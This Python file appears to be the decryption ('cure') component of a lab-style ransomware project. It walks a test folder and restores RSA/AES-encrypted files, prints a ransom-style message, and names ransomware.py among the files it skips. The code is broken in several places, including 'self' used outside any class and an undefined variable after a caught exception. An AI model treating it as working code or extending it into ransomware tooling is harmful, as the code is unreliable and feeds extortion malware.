

import os
import json
import requests
import file_decryption as dec
from base64 import b64decode, b64encode

import concurrent.futures

from rsa_key import *

# Global Constants
notencript=[ "rsa_key_public.pem", "rsa_key_private.pem","file_encryption.py", "file_decryption.py","rsa_key.py", "ransomware.py", "cure.py", "ransomware.exe", "cure.exe", "__pycache__"
, "build"]

def main():
    # Simple prompt
    print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
    print("Fine, you'll get your files back.")
    print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
    
    get_keys()
    
    # Start walk (decrypt)
    walk_dec()
    
def get_keys(self):
    ## Read Public Key File
    mode = "rb" # Set to read bits
    with open(notencript[0], mode) as file:
        key_pub = file.read()
        file.close()
    with open(notencript[1], mode) as file:
        key_priv = file.read()
        file.close()
    
    # Set data for get request
    get_data = {}
    get_data["public"] = b64encode(key_pub).decode("utf-8")
    
   
    #Recuperar la clave privada de algun lado
    #recuoperar clave del servidor
  
def callDecript(self,file_name,dirName):
    if ( not file_name in notencript ):
        file_path = os.path.join(dirName, file_name)
        # Get file names for debugging
        print("[*] %s" % file_path)
        try:
         # Open JSON File and read data
         with open(file_path, "r", encoding="utf-8") as file:
            file_data = json.load(file)
            file.close()
        except ValueError:
          pass
        # Grab data
        RSACipher = b64decode(file_data["RSACipher"])
        C = b64decode(file_data["C"])
        IV = b64decode(file_data["IV"])
        tag = b64decode(file_data["tag"])
        ext = file_data["ext"]

        # Decrypt
        M = dec.MyRSADecrypt(RSACipher, C, IV, tag, ext, notencript[1])
        
        # Re-Create original file
        name, extension = os.path.splitext(file_name)
        file_name_new = name + ext
        file_path_new = os.path.join(dirName, file_name_new)
        with open(file_path_new, "wb") as file:
            file.write(M)
            file.close()

def walk_dec(self):
     # Begin file walk
    rootDir = "TestFolder" # Root is where program starts
 
    rootDir = "TestFolder" #os.path.abspath('.').split(os.path.sep)[0]+os.path.sep 
    exclude = [self.notencript[-1], self.notencript[-2]]
    for dirName, subdirList, fileList in os.walk(rootDir):
        aux=[]
        subdirList[:] = [d for d in subdirList if d not in exclude]
        # Get directory names for debugging
        print("[+] %s" % dirName)
        aux.append(dirName)
        dirName=aux*len(fileList)
        if(len(fileList)>0):
             #concurrent files folder encription
           with concurrent.futures.ThreadPoolExecutor(max_workers=len(fileList)) as executor:
                     executor.map(self.callDecript, fileList,dirName)
            
            
                    
                    # Delete encrypted file
                    #os.remove(file_path)
                    

            
                    
                    
if __name__ == "__main__": main()